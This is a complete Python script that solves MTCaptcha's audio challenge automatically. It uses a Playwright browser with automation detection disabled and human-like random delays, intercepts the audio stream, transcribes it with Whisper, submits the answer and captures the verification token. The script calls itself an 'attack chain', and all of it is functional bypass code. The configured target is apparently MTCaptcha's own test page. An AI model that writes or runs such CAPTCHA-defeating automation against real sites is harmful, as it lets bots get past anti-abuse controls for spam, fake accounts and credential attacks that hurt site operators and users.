import os
import time
import random
import requests
import whisper
from playwright.sync_api import sync_playwright

# --- Configuration ---
WHISPER_MODEL = "tiny"
# Replace this with the URL of the site where you are testing the MTCaptcha widget
TARGET_URL = "https://www.mtcaptcha.com/test-multiple-captcha" 
AUDIO_FILENAME = "mt_payload.wav"

def random_delay(min_sec=1.0, max_sec=2.5):
    """Simulate human reaction times to avoid behavioral bot flagging."""
    time.sleep(random.uniform(min_sec, max_sec))

def download_audio(url, filename):
    print(f"[*] Downloading intercepted audio payload...")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    response = requests.get(url, headers=headers)
    with open(filename, "wb") as f:
        f.write(response.content)

def transcribe_audio(filename):
    print(f"[*] Loading Whisper '{WHISPER_MODEL}' model and filtering noise...")
    model = whisper.load_model(WHISPER_MODEL)
    result = model.transcribe(filename, fp16=False)
    
    raw_text = result["text"].strip().lower()
    clean_text = "".join(char for char in raw_text if char.isalnum() or char.isspace())
    return clean_text

def main():
    with sync_playwright() as p:
        print("[*] Booting Playwright Stealth Browser...")
        browser = p.chromium.launch(
            headless=False,
            args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
        )
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = context.new_page()

        # ---------------------------------------------------------
        # THE UPGRADE: Asynchronous Network Interception
        # ---------------------------------------------------------
        intercepted_audio_url = None

        def handle_response(response):
            nonlocal intercepted_audio_url
            url = response.url.lower()
            
            # SPY MODE: Print every MTCaptcha-related network request
            if "mtcaptcha.com" in url or "service" in url:
                print(f"[SPY] Traffic -> {url[:100]}...")
                
            # Expanded net to catch hidden streams
            if "audio" in url or ".wav" in url or "getchallenge" in url or "media" in url:
                intercepted_audio_url = response.url

        # Attach the network listener to the page BEFORE we navigate or click
        page.on("response", handle_response)

        try:
            print(f"[*] Navigating to target environment...")
            page.goto(TARGET_URL)
            random_delay(2.0, 3.0)

            # 1. Target the MTCaptcha iframe
            print("[*] Locating MTCaptcha iframe...")
            # MTCaptcha usually injects an iframe with a source containing 'mtcaptcha'
            challenge_frame = page.frame_locator("iframe[src*='mtcaptcha']").first
            
            # Find the speaker icon. Using a CSS selector that looks for audio-related classes/titles
            audio_button = challenge_frame.locator("button[title*='audio'], .mt-audio-btn, .mtcap-audio-btn, [class*='audio']").first
            audio_button.wait_for(state="visible", timeout=15000)

            # 2. Trigger Audio and Catch the Stream
            print("[*] Requesting Audio Fallback and monitoring network traffic...")
            audio_button.click()
            
            # Wait a few seconds for the network hook to snag the URL
            for _ in range(10):
                if intercepted_audio_url:
                    break
                time.sleep(0.5)

            if not intercepted_audio_url:
                raise Exception("Failed to intercept the MTCaptcha audio stream in transit.")

            print(f"[+] Successfully intercepted hidden audio URL!")
            
            # 3. Download and Transcribe
            download_audio(intercepted_audio_url, AUDIO_FILENAME)
            solved_text = transcribe_audio(AUDIO_FILENAME)
            print(f"\n[!!!] WHISPER EXTRACTED: '{solved_text}'\n")

            # 4. Injection and Verification
            print("[*] Injecting payload into DOM...")
            # Target the input box using placeholder text or standard name attributes
            input_box = challenge_frame.locator("input[placeholder*='text from image'], input[name='mtcaptcha-audio-input']").first
            input_box.fill(solved_text)
            random_delay(0.5, 1.0)

            print("[*] Submitting verification...")
            # MTCaptcha typically accepts an "Enter" keypress to verify the input
            input_box.press("Enter")

            print("[+] Attack chain complete! Holding browser open for 10 seconds to verify state.")
            
            # 5. Token Verification Check
            try:
                # Look for the hidden cryptographic token injected into the main page DOM upon success
                token_element = page.locator("input[name='mtcaptcha-verifiedtoken']")
                token = token_element.input_value(timeout=4000)
                if token:
                    print(f"\n[SUCCESS] Bypass confirmed. Captured Auth Token: {token[:40]}...\n")
            except Exception:
                print("[*] Could not locate an exposed success token, check the browser visually.")

            time.sleep(10)

        except Exception as e:
            print(f"[!] Execution failed: {e}")
        
        finally:
            if os.path.exists(AUDIO_FILENAME):
                os.remove(AUDIO_FILENAME)
            browser.close()

if __name__ == "__main__":
    main()
